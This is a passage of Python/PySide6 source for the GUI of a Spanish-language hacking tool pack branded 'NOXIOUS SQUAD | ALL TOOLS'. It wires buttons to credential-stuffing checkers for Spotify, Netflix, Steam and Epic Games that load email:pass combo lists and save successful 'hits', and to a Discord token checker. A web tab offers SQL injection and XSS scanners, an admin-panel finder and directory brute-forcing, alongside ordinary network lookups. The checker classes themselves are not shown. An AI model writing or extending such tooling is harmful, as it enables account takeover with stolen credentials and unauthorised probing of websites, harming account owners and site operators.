        self.max_btn.clicked.connect(self.toggle_maximize)
        self.close_btn = QPushButton("✕")
        self.close_btn.setObjectName("closeBtn")
        self.close_btn.clicked.connect(parent.close)
        layout.addWidget(self.min_btn)
        layout.addWidget(self.max_btn)
        layout.addWidget(self.close_btn)
    def toggle_maximize(self):
        if self.parent.isMaximized():
            self.parent.showNormal()
        else:
            self.parent.showMaximized()

class MethodPackGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("NOXIOUS SQUAD | ALL TOOLS")
        self.setWindowFlag(Qt.FramelessWindowHint)
        self.setAttribute(Qt.WA_TranslucentBackground, True)
        self.resize(1420, 960)
        self.background = FloatingDots(self, count=260)
        self.background.setGeometry(0, 0, self.width(), self.height())
        self.background.lower()
        self.central = QWidget(self)
        self.central.setStyleSheet("""
            QWidget { background: rgba(10, 13, 10, 0.65); color: #E6F7E0; font-family: 'Segoe UI'; }
            QTabWidget::pane { border: 1px solid #2B362B; border-radius: 12px; background: rgba(18, 23, 18, 0.82); }
            QTabBar::tab { background: rgba(23, 29, 23, 0.9); color: #CFECC7; border: 1px solid #2B362B; border-bottom: none; border-top-left-radius: 8px; border-top-right-radius: 8px; padding: 9px 14px; margin-right: 3px; font: 700 9px 'Segoe UI'; }
            QTabBar::tab:selected { background: rgba(31, 41, 31, 0.95); color: #A3FF3D; border: 1px solid #A3FF3D; }
            QTabBar::tab:hover { background: rgba(37,50,37,0.95); }
            QGroupBox { background: rgba(23, 29, 23, 0.88); border: 1px solid #2B362B; border-radius: 12px; margin-top: 14px; font: 800 10px 'Segoe UI'; color: #A3FF3D; padding-top: 10px; }
            QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 8px; background: rgba(23,29,23,0.9); border-radius: 4px; }
            QLabel { color: #E6F7E0; font-size: 11px; }
            QLineEdit, QTextEdit, QComboBox, QSpinBox { background: rgba(15, 19, 15, 0.85); color: #E6F7E0; border: 1px solid #2B362B; border-radius: 8px; padding: 8px 10px; font-size: 11px; selection-background-color: #A3FF3D; selection-color: #111911; }
            QLineEdit:focus, QTextEdit:focus { border: 1px solid #A3FF3D; }
            QPushButton { background: rgba(30, 41, 30, 0.9); color: #E6F7E0; border: 1px solid #2B362B; border-radius: 9px; padding: 8px 14px; font: 700 10px 'Segoe UI'; }
            QPushButton:hover { background: rgba(37, 50, 37, 0.95); border: 1px solid #3A4A3A; }
            QPushButton#runBtn { background: #A3FF3D; color: #111911; border: none; font: 800 10px 'Segoe UI'; }
            QPushButton#runBtn:hover { background: #B9FF63; }
            QPushButton#smallBtn { padding: 5px 10px; font: 700 9px 'Segoe UI'; background: rgba(40,55,40,0.9); }
            QTextEdit#logBox { background: rgba(8, 14, 8, 0.92); border: 1px solid #2B362B; border-radius: 10px; font-family: 'Consolas', 'Cascadia Code', monospace; font-size: 11.5px; line-height: 1.4; padding: 8px; }
            QScrollArea { background: transparent; border: none; }
            QScrollBar:vertical { background: rgba(15,19,15,0.5); width: 10px; border-radius: 5px; }
            QScrollBar::handle:vertical { background: #2B362B; border-radius: 5px; min-height: 20px; }
            QScrollBar::handle:vertical:hover { background: #A3FF3D; }
            QComboBox::drop-down { border: none; }
            QHeaderView { background: transparent; }
        """)
        self.setCentralWidget(self.central)
        outer = QVBoxLayout(self.central)
        outer.setContentsMargins(10, 10, 10, 10)
        outer.setSpacing(10)
        self.title_bar = TitleBar(self)
        outer.addWidget(self.title_bar)
        self.status_bar = QWidget(self)
        self.status_bar.setObjectName("statusBar")
        self.status_bar.setStyleSheet("""
            QWidget#statusBar { background: rgba(17, 22, 17, 0.88); border: 1px solid #2B362B; border-radius: 10px; }
            QLabel { color: #E6F7E0; font-size: 11px; }
            QPushButton { background: #A3FF3D; color: #111911; border: none; border-radius: 8px; padding: 7px 12px; font: 700 10px 'Segoe UI'; }
            QPushButton:hover { background: #B9FF63; }
        """)
        status_layout = QHBoxLayout(self.status_bar)
        status_layout.setContentsMargins(12, 8, 12, 8)
        self.version_label = QLabel("v2.0 — NOXIOUS SQUAD | ALL TOOLS")
        self.version_label.setStyleSheet("font-weight: 800; color: #A3FF3D;")
        self.dev_label = QLabel("👤 Dev: nscp12")
        self.dev_label.setStyleSheet("color: #D6F7C4; font-weight: 600;")
        self.discord_btn = QPushButton("💬 Discord")
        self.discord_btn.clicked.connect(self.open_discord)
        status_layout.addWidget(self.version_label)
        status_layout.addStretch(1)
        status_layout.addWidget(self.dev_label)
        status_layout.addWidget(self.discord_btn)
        outer.addWidget(self.status_bar)
        self.tabs = QTabWidget(self)
        self.tabs.setTabPosition(QTabWidget.North)
        self.tabs.setMovable(True)
        outer.addWidget(self.tabs, stretch=5)
        console_container = QWidget(self)
        console_container.setObjectName("consoleContainer")
        console_container.setStyleSheet("""
            QWidget#consoleContainer { background: rgba(11, 16, 11, 0.92); border: 1px solid #2B362B; border-radius: 12px; }
            QLabel#consoleTitle { color: #A3FF3D; font: 800 11px 'Segoe UI'; background: transparent; border: none; }
            QLabel#consoleSub { color: #8BA98B; font: 600 8px 'Segoe UI'; background: transparent; border: none; }
            QPushButton#consoleBtn { background: rgba(30,41,30,0.9); color: #CFECC7; border: 1px solid #2B362B; border-radius: 6px; padding: 4px 8px; font: 700 8px 'Segoe UI'; }
            QPushButton#consoleBtn:hover { background: #1A241A; color: #A3FF3D; border: 1px solid #A3FF3D; }
        """)
        console_layout = QVBoxLayout(console_container)
        console_layout.setContentsMargins(8, 8, 8, 8)
        console_layout.setSpacing(6)
        header_row = QHBoxLayout()
        title_box = QVBoxLayout()
        console_title = QLabel("📟 CONSOLA DE SALIDA")
        console_title.setObjectName("consoleTitle")
        console_sub = QLabel("Log")
        console_sub.setObjectName("consoleSub")
        title_box.addWidget(console_title)
        title_box.addWidget(console_sub)
        header_row.addLayout(title_box)
        header_row.addStretch(1)
        self.btn_clear = QPushButton("🧹 Limpiar")
        self.btn_clear.setObjectName("consoleBtn")
        self.btn_clear.clicked.connect(self.clear_log)
        self.btn_save = QPushButton("💾 Guardar")
        self.btn_save.setObjectName("consoleBtn")
        self.btn_save.clicked.connect(self.save_log)
        self.btn_copy = QPushButton("📋 Copiar")
        self.btn_copy.setObjectName("consoleBtn")
        self.btn_copy.clicked.connect(self.copy_log)
        header_row.addWidget(self.btn_clear)
        header_row.addWidget(self.btn_save)
        header_row.addWidget(self.btn_copy)
        console_layout.addLayout(header_row)
        sep = QFrame()
        sep.setFrameShape(QFrame.HLine)
        sep.setStyleSheet("background: #2B362B; max-height: 1px; border: none;")
        console_layout.addWidget(sep)
        self.log_box = QTextEdit(self)
        self.log_box.setObjectName("logBox")
        self.log_box.setReadOnly(True)
        self.log_box.setMinimumHeight(340)
        self.log_box.setPlaceholderText("🚀 Listo. Ejecuta cualquier herramienta y verás aquí los resultados ordenados con emojis...")
        self.log_box.setLineWrapMode(QTextEdit.WidgetWidth)
        console_layout.addWidget(self.log_box)
        outer.addWidget(console_container, stretch=3)
        self.init_tabs()
        self._drag_pos = None
        self.log_block("🚀", "NOXIOUS SQUAD | ALL TOOLS", {"Soporte": "💬 Discord: " + DISCORD_INVITE}, level="success")

    def resizeEvent(self, event):
        super().resizeEvent(event)
        if hasattr(self, 'background'):
            self.background.setGeometry(0, 0, self.width(), self.height())
    def closeEvent(self, event):
        try:
            from PySide6.QtWidgets import QApplication
            QApplication.instance().quit()
        except:
            pass
        super().closeEvent(event)
    def open_discord(self):
        try:
            from PySide6.QtGui import QDesktopServices, QUrl
            QDesktopServices.openUrl(QUrl(DISCORD_INVITE))
        except Exception:
            import webbrowser
            webbrowser.open(DISCORD_INVITE)
    def mousePressEvent(self, event):
        if event.button() == Qt.LeftButton:
            self._drag_pos = event.globalPosition().toPoint() - self.frameGeometry().topLeft()
    def mouseMoveEvent(self, event):
        if event.buttons() == Qt.LeftButton and self._drag_pos is not None:
            self.move(event.globalPosition().toPoint() - self._drag_pos)
    def mouseReleaseEvent(self, event):
        self._drag_pos = None

    def _timestamp(self):
        return datetime.now().strftime("%H:%M:%S")
    def _color_for_level(self, level):
        return {"success": "#6DFF9B", "error": "#FF6B6B", "warning": "#FFD93D", "info": "#6DB8FF", "debug": "#8BA98B"}.get(level, "#E6F7E0")
    def log(self, msg):
        level="info"
        if any(x in msg for x in ["❌","Error","Falló","Failed"]): level="error"
        elif any(x in msg for x in ["✅","Éxito","Success","Limpio"]): level="success"
        elif any(x in msg for x in ["⚠️","Warning"]): level="warning"
        ts=self._timestamp()
        color=self._color_for_level(level)
        if msg.strip().startswith("<"):
            self.log_box.append(msg)
        else:
            html=f'<div style="margin:2px 0;"><span style="color:#8BA98B;">[{ts}]</span> <span style="color:{color};">{msg}</span></div>'
            self.log_box.append(html)
        self.log_box.verticalScrollBar().setValue(self.log_box.verticalScrollBar().maximum())
        QApplication.processEvents()
    def log_html(self, html):
        self.log_box.append(html)
        self.log_box.verticalScrollBar().setValue(self.log_box.verticalScrollBar().maximum())
    def log_info(self, msg):
        self.log(f"ℹ️ {msg}")
    def log_success(self, msg):
        self.log(f"✅ {msg}")
    def log_error(self, msg):
        self.log(f"❌ {msg}")
    def log_warning(self, msg):
        self.log(f"⚠️ {msg}")
    def log_block(self, emoji, title, data_dict, level="info"):
        ts=self._timestamp()
        color=self._color_for_level(level)
        border_color=color
        html=f'<div style="border:1px solid {border_color}; border-radius:8px; margin:6px 0; background:rgba(23,29,23,0.6);">'
        html+=f'<div style="background:{border_color}; color:#0A0D0A; padding:6px 10px; border-top-left-radius:7px; border-top-right-radius:7px; font-weight:800; font-size:11px;">{emoji} [{ts}] {title}</div>'
        html+=f'<div style="padding:8px 10px; font-family:Consolas, monospace; font-size:11px; line-height:1.5;">'
        if isinstance(data_dict, dict):
            for k,v in data_dict.items():
                v_str=str(v)
                if len(v_str)>300:
                    v_str=v_str[:300]+"..."
                v_str=v_str.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
                html+=f'<div><span style="color:#A3FF3D; font-weight:700;">• {k}:</span> <span style="color:#E6F7E0;">{v_str}</span></div>'
        elif isinstance(data_dict, list):
            for item in data_dict[:20]:
                item_str=str(item).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
                html+=f'<div style="color:#E6F7E0;">• {item_str}</div>'
            if len(data_dict)>20:
                html+=f'<div style="color:#8BA98B;">... y {len(data_dict)-20} más</div>'
        else:
            txt=str(data_dict).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
            html+=f'<div style="color:#E6F7E0; white-space:pre-wrap;">{txt}</div>'
        html+=f'</div><div style="padding:0 10px 6px 10px; color:#8BA98B; font-size:9px;">— {level.upper()} • {ts}</div></div>'
        self.log_box.append(html)
        self.log_box.verticalScrollBar().setValue(self.log_box.verticalScrollBar().maximum())
        QApplication.processEvents()
    def log_data(self, title, data, emoji="📊"):
        if isinstance(data, dict):
            self.log_block(emoji, title, data, level="info")
        else:
            self.log_block(emoji, title, {"Resultado": str(data)[:2000]}, level="info")
    def clear_log(self):
        self.log_box.clear()
        self.log_info("🧹 Consola limpiada")
    def save_log(self):
        path, _ = QFileDialog.getSaveFileName(self, "Guardar log", f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", "Text files (*.txt)")
        if path:
            try:
                Utils.save_file(path, self.log_box.toPlainText())
                self.log_success(f"💾 Log guardado en {path}")
            except Exception as e:
                self.log_error(f"No se pudo guardar: {e}")
    def copy_log(self):
        try:
            self.log_box.selectAll()
            self.log_box.copy()
            self.log_success("📋 Log copiado al portapapeles")
        except Exception as e:
            self.log_error(f"Error copiando: {e}")
    def browse_file(self, field):
        path, _ = QFileDialog.getOpenFileName(self, "Seleccionar archivo", os.getcwd(), "Text files (*.txt);;All files (*.*)")
        if path:
            field.setText(path)

    def _run_checker(self, name, checker_cls, file_field):
        path = file_field.text().strip()
        if not path or not os.path.exists(path):
            self.log_error(f"[{name}] 📂 Archivo no encontrado: {path}")
            return
        try:
            lines = [l.strip() for l in open(path, "r", encoding="utf-8", errors="ignore") if ":" in l]
            combos = [(l.split(":", 1)[0].strip(), l.split(":", 1)[1].strip()) for l in lines if ":" in l]
            self.log_block("📂", f"{name} - Carga", {"Archivo": path, "Combos cargados": len(combos), "Hilos": 12}, level="info")
        except Exception as e:
            self.log_error(f"[{name}] Error leyendo archivo: {e}")
            return
        def worker():
            try:
                c = checker_cls(log_cb=self.log)
                hits, frees = c.run(combos)
                self.log_block("🎯" if hits else "ℹ️", f"{name} - Resultados", {"✅ Hits": len(hits), "❌ Free": len(frees), "📊 Total": len(combos), "💾 Guardado": f"hits_{name}_{datetime.now().strftime('%H%M%S')}.txt" if hits else "No hits"}, level="success" if hits else "info")
                if hits:
                    ts = datetime.now().strftime("%H%M%S")
                    Utils.save_file(f"hits_{name}_{ts}.txt", "\n".join(hits))
            except Exception as e:
                self.log_error(f"[{name}] Worker error: {e}")
        threading.Thread(target=worker, daemon=True).start()

    def _run_discord_checker(self, field):
        path = field.text().strip()
        if not path or not os.path.exists(path):
            self.log_error(f"[Discord] 📂 Archivo no encontrado")
            return
        def worker():
            try:
                tokens = [l.strip() for l in open(path, "r", encoding="utf-8", errors="ignore") if l.strip()]
                self.log_info(f"🔍 [Discord] Verificando {len(tokens)} tokens...")
                checker = DiscordChecker(log_cb=self.log)
                hits = checker.run(tokens)
                self.log_block("🎯", "Discord - Resultados", {"✅ Válidos": len(hits), "📊 Total": len(tokens)}, level="success" if hits else "info")
                if hits:
                    ts = datetime.now().strftime("%H%M%S")
                    Utils.save_file(f"hits_Discord_{ts}.txt", "\n".join(hits))
            except Exception as e:
                self.log_error(f"[Discord] Error: {e}")
        threading.Thread(target=worker, daemon=True).start()

    def make_combo_block(self, title, checker_cls, placeholder="Combo file"):
        group = QGroupBox(title)
        layout = QVBoxLayout(group)
        row = QHBoxLayout()
        field = QLineEdit()
        field.setPlaceholderText(placeholder)
        browse = QPushButton("📂")
        browse.setToolTip("Buscar archivo")
        run = QPushButton("▶ RUN")
        run.setObjectName("runBtn")
        browse.clicked.connect(lambda: self.browse_file(field))
        run.clicked.connect(lambda: self._run_checker(title, checker_cls, field))
        row.addWidget(field, stretch=1)
        row.addWidget(browse)
        row.addWidget(run)
        layout.addLayout(row)
        return group

    def _group(self, title, widgets):
        group = QGroupBox(title)
        layout = QVBoxLayout(group)
        layout.setSpacing(6)
        if isinstance(widgets, (QVBoxLayout, QHBoxLayout, QFormLayout)):
            container = QWidget()
            container.setLayout(widgets)
            layout.addWidget(container)
        else:
            try:
                for w in widgets:
                    if isinstance(w, (QVBoxLayout, QHBoxLayout, QFormLayout)):
                        container = QWidget()
                        container.setLayout(w)
                        layout.addWidget(container)
                    else:
                        layout.addWidget(w)
            except TypeError:
                if isinstance(widgets, QWidget):
                    layout.addWidget(widgets)
                else:
                    layout.addWidget(QLabel(str(widgets)))
        return group

    def _scroll_wrap(self, widget):
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAsNeeded)
        scroll.setWidget(widget)
        return scroll

    def init_tabs(self):
        acc = QWidget(); acc_layout = QVBoxLayout(acc); acc_layout.setContentsMargins(10, 10, 10, 10); acc_layout.setSpacing(8)
        acc_layout.addWidget(self.make_combo_block("🔐 Spotify Checker", SpotifyChecker, "Combo file email:pass"))
        acc_layout.addWidget(self.make_combo_block("🎬 Netflix Checker", NetflixChecker))
        acc_layout.addWidget(self.make_combo_block("🎮 Steam Checker", SteamChecker))
        discord_group = QGroupBox("💬 Discord Token Checker")
        disc_layout = QHBoxLayout(discord_group)
        disc_field = QLineEdit(); disc_field.setPlaceholderText("Token file (uno por línea)")
        disc_browse = QPushButton("📂"); disc_run = QPushButton("▶ RUN"); disc_run.setObjectName("runBtn")
        disc_browse.clicked.connect(lambda: self.browse_file(disc_field))
        disc_run.clicked.connect(lambda: self._run_discord_checker(disc_field))
        disc_layout.addWidget(disc_field, stretch=1); disc_layout.addWidget(disc_browse); disc_layout.addWidget(disc_run)
        acc_layout.addWidget(discord_group)
        acc_layout.addWidget(self.make_combo_block("🎯 Epic Games Checker", EpicGamesChecker))
        acc_layout.addStretch(1)
        self.tabs.addTab(self._scroll_wrap(acc), "🔐 Cuentas")

        web = QWidget(); web_layout = QVBoxLayout(web); web_layout.setContentsMargins(10, 10, 10, 10); web_layout.setSpacing(8)
        sqli_w = QWidget(); sqli_row = QHBoxLayout(sqli_w); sqli_row.setContentsMargins(0,0,0,0)
        sqli_field = QLineEdit(); sqli_field.setPlaceholderText("https://ejemplo.com/page?id=1")
        sqli_run = QPushButton("▶ RUN"); sqli_run.setObjectName("runBtn")
        sqli_run.clicked.connect(lambda: self._run_sqli(sqli_field))
        sqli_row.addWidget(sqli_field, stretch=1); sqli_row.addWidget(sqli_run)
        web_layout.addWidget(self._group("💉 SQL Injection Scanner", [sqli_w]))
        xss_w = QWidget(); xss_row = QHBoxLayout(xss_w); xss_row.setContentsMargins(0,0,0,0)
        xss_field = QLineEdit(); xss_field.setPlaceholderText("https://ejemplo.com/search?q=")
        xss_run = QPushButton("▶ RUN"); xss_run.setObjectName("runBtn")
        xss_run.clicked.connect(lambda: self._run_xss(xss_field))
        xss_row.addWidget(xss_field, stretch=1); xss_row.addWidget(xss_run)
        web_layout.addWidget(self._group("⚔️ XSS Scanner (Reflected)", [xss_w]))
        admin_w = QWidget(); admin_row = QHBoxLayout(admin_w); admin_row.setContentsMargins(0,0,0,0)
        admin_field = QLineEdit(); admin_field.setPlaceholderText("https://ejemplo.com")
        admin_run = QPushButton("▶ RUN"); admin_run.setObjectName("runBtn")
        admin_run.clicked.connect(lambda: self._run_admin(admin_field))
        admin_row.addWidget(admin_field, stretch=1); admin_row.addWidget(admin_run)
        web_layout.addWidget(self._group("🕵️ Admin Finder (30+ paths)", [admin_w]))
        dir_w = QWidget(); dir_row = QHBoxLayout(dir_w); dir_row.setContentsMargins(0,0,0,0)
        dir_url = QLineEdit(); dir_url.setPlaceholderText("https://ejemplo.com")
        dir_words = QLineEdit(); dir_words.setPlaceholderText("Wordlist path")
        dir_browse = QPushButton("📂"); dir_browse.clicked.connect(lambda: self.browse_file(dir_words))
        dir_run = QPushButton("▶ RUN"); dir_run.setObjectName("runBtn")
        dir_run.clicked.connect(lambda: self._run_dirbrute(dir_url, dir_words))
        dir_row.addWidget(dir_url, stretch=1); dir_row.addWidget(dir_words, stretch=1); dir_row.addWidget(dir_browse); dir_row.addWidget(dir_run)
        web_layout.addWidget(self._group("📁 Directory Brute Force", [dir_w]))
        sub_w = QWidget(); sub_row = QHBoxLayout(sub_w); sub_row.setContentsMargins(0,0,0,0)
        sub_field = QLineEdit(); sub_field.setPlaceholderText("example.com")
        sub_run = QPushButton("▶ RUN"); sub_run.setObjectName("runBtn")
        sub_run.clicked.connect(lambda: self._run_sub(sub_field))
        sub_row.addWidget(sub_field, stretch=1); sub_row.addWidget(sub_run)
        web_layout.addWidget(self._group("🌐 Subdomain Scanner", [sub_w]))
        web_layout.addStretch(1)
        self.tabs.addTab(self._scroll_wrap(web), "🌐 Web")

        priv = QWidget(); priv_layout = QVBoxLayout(priv); priv_layout.setContentsMargins(10,10,10,10); priv_layout.setSpacing(8)
        fp_w = QWidget(); fp_row = QHBoxLayout(fp_w); fp_row.setContentsMargins(0,0,0,0)
        fp_run = QPushButton("▶ GENERAR FINGERPRINT"); fp_run.setObjectName("runBtn")
        fp_run.clicked.connect(lambda: self._run_fingerprint())
        fp_row.addWidget(fp_run)
        priv_layout.addWidget(self._group("🖐️ Fingerprint (Canvas, WebGL, Headers)", [fp_w]))
        br_w = QWidget(); br_row = QHBoxLayout(br_w); br_row.setContentsMargins(0,0,0,0)
        br_field = QLineEdit(); br_field.setPlaceholderText("User-Agent (vacío = tu UA actual)")
        br_run = QPushButton("▶ ANALIZAR"); br_run.setObjectName("runBtn")
        br_run.clicked.connect(lambda: self._run_browser(br_field))
        br_row.addWidget(br_field, stretch=1); br_row.addWidget(br_run)
        priv_layout.addWidget(self._group("🌐 Browser Info (Parser UA)", [br_w]))
        dnsleak_w = QWidget(); dnsleak_row = QHBoxLayout(dnsleak_w); dnsleak_row.setContentsMargins(0,0,0,0)
        dnsleak_run = QPushButton("▶ CHEQUEAR DNS LEAK"); dnsleak_run.setObjectName("runBtn")
        dnsleak_run.clicked.connect(lambda: self._run_dnsleak())
        dnsleak_row.addWidget(dnsleak_run)
        priv_layout.addWidget(self._group("🔓 DNS Leak Test", [dnsleak_w]))
        webrtc_w = QWidget(); webrtc_row = QHBoxLayout(webrtc_w); webrtc_row.setContentsMargins(0,0,0,0)
        webrtc_run = QPushButton("▶ DETECTAR WebRTC LEAK"); webrtc_run.setObjectName("runBtn")
        webrtc_run.clicked.connect(lambda: self._run_webrtc())
        webrtc_row.addWidget(webrtc_run)
        priv_layout.addWidget(self._group("📹 WebRTC Leak", [webrtc_w]))
        checkup_w = QWidget(); checkup_row = QHBoxLayout(checkup_w); checkup_row.setContentsMargins(0,0,0,0)
        checkup_run = QPushButton("▶ PRIVACY CHECKUP "); checkup_run.setObjectName("runBtn")
        checkup_run.clicked.connect(lambda: self._run_privacy_checkup())
        checkup_row.addWidget(checkup_run)
        priv_layout.addWidget(self._group("🛡️ Privacy Checkup", [checkup_w]))
        torrent_w = QWidget(); torrent_row = QHBoxLayout(torrent_w); torrent_row.setContentsMargins(0,0,0,0)
        torrent_run = QPushButton("▶ TORRENT LEAK CHECK"); torrent_run.setObjectName("runBtn")
        torrent_run.clicked.connect(lambda: self._run_torrentleak())
        torrent_row.addWidget(torrent_run)
        priv_layout.addWidget(self._group("🧲 Torrent Leak (IP expuesta)", [torrent_w]))
        priv_layout.addStretch(1)
        self.tabs.addTab(self._scroll_wrap(priv), "🛡️ Privacidad")

        sec = QWidget(); sec_layout = QVBoxLayout(sec); sec_layout.setContentsMargins(10,10,10,10); sec_layout.setSpacing(8)
        breach_w = QWidget(); breach_row = QHBoxLayout(breach_w); breach_row.setContentsMargins(0,0,0,0)
        breach_field = QLineEdit(); breach_field.setPlaceholderText("user@example.com")
        breach_run = QPushButton("▶ CHECK"); breach_run.setObjectName("runBtn")
        breach_run.clicked.connect(lambda: self._run_email_leak(breach_field))
        breach_row.addWidget(breach_field, stretch=1); breach_row.addWidget(breach_run)
        sec_layout.addWidget(self._group("📧 Email Leak", [breach_w]))
        pwd_w = QWidget(); pwd_row = QHBoxLayout(pwd_w); pwd_row.setContentsMargins(0,0,0,0)
        pwd_len = QSpinBox(); pwd_len.setRange(8,64); pwd_len.setValue(16)
        pwd_run = QPushButton("▶ GENERAR"); pwd_run.setObjectName("runBtn")
        pwd_out = QLineEdit(); pwd_out.setPlaceholderText("Password generado..."); pwd_out.setReadOnly(True)
        pwd_run.clicked.connect(lambda: self._run_pwdgen(pwd_len, pwd_out))
        pwd_row.addWidget(QLabel("Longitud:")); pwd_row.addWidget(pwd_len); pwd_row.addWidget(pwd_run); pwd_row.addWidget(pwd_out, stretch=1)
        sec_layout.addWidget(self._group("🔑 Password Generator (secrets, entropía)", [pwd_w]))
        port2_w = QWidget(); port2_row = QHBoxLayout(port2_w); port2_row.setContentsMargins(0,0,0,0)
        port2_field = QLineEdit(); port2_field.setPlaceholderText("example.com o 8.8.8.8")
        port2_ports = QLineEdit(); port2_ports.setPlaceholderText("22,80,443 (vacío=auto)")
        port2_run = QPushButton("▶ SCAN"); port2_run.setObjectName("runBtn")
        port2_run.clicked.connect(lambda: self._run_portscan_api(port2_field, port2_ports))
        port2_row.addWidget(port2_field, stretch=1); port2_row.addWidget(port2_ports, stretch=1); port2_row.addWidget(port2_run)
        sec_layout.addWidget(self._group("🔍 Port Scanner", [port2_w]))
        bl_w = QWidget(); bl_row = QHBoxLayout(bl_w); bl_row.setContentsMargins(0,0,0,0)
        bl_field = QLineEdit(); bl_field.setPlaceholderText("8.8.8.8")
        bl_run = QPushButton("▶ CHECK"); bl_run.setObjectName("runBtn")
        bl_run.clicked.connect(lambda: self._run_blacklist(bl_field))
        bl_row.addWidget(bl_field, stretch=1); bl_row.addWidget(bl_run)
        sec_layout.addWidget(self._group("🚫 Blacklist", [bl_w]))
        sechead_w = QWidget(); sechead_row = QHBoxLayout(sechead_w); sechead_row.setContentsMargins(0,0,0,0)
        sechead_field = QLineEdit(); sechead_field.setPlaceholderText("https://example.com")
        sechead_run = QPushButton("▶ ANALIZAR"); sechead_run.setObjectName("runBtn")
        sechead_run.clicked.connect(lambda: self._run_secheaders(sechead_field))
        sechead_row.addWidget(sechead_field, stretch=1); sechead_row.addWidget(sechead_run)
        sec_layout.addWidget(self._group("🛡️ Security Headers", [sechead_w]))
        emailauth_w = QWidget(); emailauth_row = QHBoxLayout(emailauth_w); emailauth_row.setContentsMargins(0,0,0,0)
        emailauth_field = QLineEdit(); emailauth_field.setPlaceholderText("gmail.com o user@gmail.com")
        emailauth_run = QPushButton("▶ CHECK"); emailauth_run.setObjectName("runBtn")
        emailauth_run.clicked.connect(lambda: self._run_emailauth(emailauth_field))
        emailauth_row.addWidget(emailauth_field, stretch=1); emailauth_row.addWidget(emailauth_run)
        sec_layout.addWidget(self._group("✉️ Email Auth", [emailauth_w]))
        sec_layout.addStretch(1)
        self.tabs.addTab(self._scroll_wrap(sec), "🔒 Seguridad")

        net = QWidget(); net_layout = QVBoxLayout(net); net_layout.setContentsMargins(10,10,10,10); net_layout.setSpacing(8)
        myip_w = QWidget(); myip_row = QHBoxLayout(myip_w); myip_row.setContentsMargins(0,0,0,0)
        myip_run = QPushButton("▶ MI IP "); myip_run.setObjectName("runBtn")
        myip_run.clicked.connect(lambda: self._run_myip())
        myip_row.addWidget(myip_run)
        net_layout.addWidget(self._group("🌍 My IP", [myip_w]))
        iplook_w = QWidget(); iplook_row = QHBoxLayout(iplook_w); iplook_row.setContentsMargins(0,0,0,0)
        iplook_field = QLineEdit(); iplook_field.setPlaceholderText("8.8.8.8")
        iplook_run = QPushButton("▶ LOOKUP"); iplook_run.setObjectName("runBtn")
        iplook_run.clicked.connect(lambda: self._run_iplookup(iplook_field))
        iplook_row.addWidget(iplook_field, stretch=1); iplook_row.addWidget(iplook_run)
        net_layout.addWidget(self._group("🔎 IP Lookup", [iplook_w]))
        asn_w = QWidget(); asn_row = QHBoxLayout(asn_w); asn_row.setContentsMargins(0,0,0,0)
        asn_field = QLineEdit(); asn_field.setPlaceholderText("8.8.8.8 o AS15169 o google")
        asn_run = QPushButton("▶ LOOKUP"); asn_run.setObjectName("runBtn")
        asn_run.clicked.connect(lambda: self._run_asn(asn_field))
        asn_row.addWidget(asn_field, stretch=1); asn_row.addWidget(asn_run)
        net_layout.addWidget(self._group("🏢 ASN Lookup", [asn_w]))
        dns2_w = QWidget(); dns2_row = QHBoxLayout(dns2_w); dns2_row.setContentsMargins(0,0,0,0)
        dns2_field = QLineEdit(); dns2_field.setPlaceholderText("example.com")
        dns2_combo = QComboBox(); dns2_combo.addItems(["A","AAAA","MX","NS","TXT","CNAME","SOA","CAA","PTR"])
        dns2_run = QPushButton("▶ LOOKUP"); dns2_run.setObjectName("runBtn")
        dns2_run.clicked.connect(lambda: self._run_dns2(dns2_field, dns2_combo))
        dns2_row.addWidget(dns2_field, stretch=1); dns2_row.addWidget(dns2_combo); dns2_row.addWidget(dns2_run)
        net_layout.addWidget(self._group("📡 DNS Lookup", [dns2_w]))
        speed_w = QWidget(); speed_row = QHBoxLayout(speed_w); speed_row.setContentsMargins(0,0,0,0)
        speed_run = QPushButton("▶ SPEED TEST"); speed_run.setObjectName("runBtn")
        speed_run.clicked.connect(lambda: self._run_speedtest())
        speed_row.addWidget(speed_run)
        net_layout.addWidget(self._group("⚡ Speed Test (ping + download)", [speed_w]))
        rdns_w = QWidget(); rdns_row = QHBoxLayout(rdns_w); rdns_row.setContentsMargins(0,0,0,0)
        rdns_field = QLineEdit(); rdns_field.setPlaceholderText("8.8.8.8")
        rdns_run = QPushButton("▶ LOOKUP"); rdns_run.setObjectName("runBtn")
        rdns_run.clicked.connect(lambda: self._run_rdns(rdns_field))
        rdns_row.addWidget(rdns_field, stretch=1); rdns_row.addWidget(rdns_run)
        net_layout.addWidget(self._group("🔄 Reverse DNS", [rdns_w]))
        trace_w = QWidget(); trace_row = QHBoxLayout(trace_w); trace_row.setContentsMargins(0,0,0,0)
        trace_field = QLineEdit(); trace_field.setPlaceholderText("google.com o 1.1.1.1")
        trace_run = QPushButton("▶ TRACE"); trace_run.setObjectName("runBtn")
        trace_run.clicked.connect(lambda: self._run_traceroute(trace_field))
        trace_row.addWidget(trace_field, stretch=1); trace_row.addWidget(trace_run)
        net_layout.addWidget(self._group("🛣️ Traceroute", [trace_w]))
        whois_w = QWidget(); whois_row = QHBoxLayout(whois_w); whois_row.setContentsMargins(0,0,0,0)
        whois_field = QLineEdit(); whois_field.setPlaceholderText("google.com")
        whois_run = QPushButton("▶ WHOIS"); whois_run.setObjectName("runBtn")
        whois_run.clicked.connect(lambda: self._run_whois(whois_field))
        whois_row.addWidget(whois_field, stretch=1); whois_row.addWidget(whois_run)
        net_layout.addWidget(self._group("📜 WHOIS / RDAP", [whois_w]))
        net_layout.addStretch(1)
        self.tabs.addTab(self._scroll_wrap(net), "📡 Red")

        more = QWidget(); more_layout = QVBoxLayout(more); more_layout.setContentsMargins(10,10,10,10); more_layout.setSpacing(8)
        subnet_w = QWidget(); subnet_row = QHBoxLayout(subnet_w); subnet_row.setContentsMargins(0,0,0,0)
        subnet_field = QLineEdit(); subnet_field.setPlaceholderText("192.168.1.0/24")
        subnet_run = QPushButton("▶ CALC"); subnet_run.setObjectName("runBtn")
        subnet_run.clicked.connect(lambda: self._run_subnet(subnet_field))
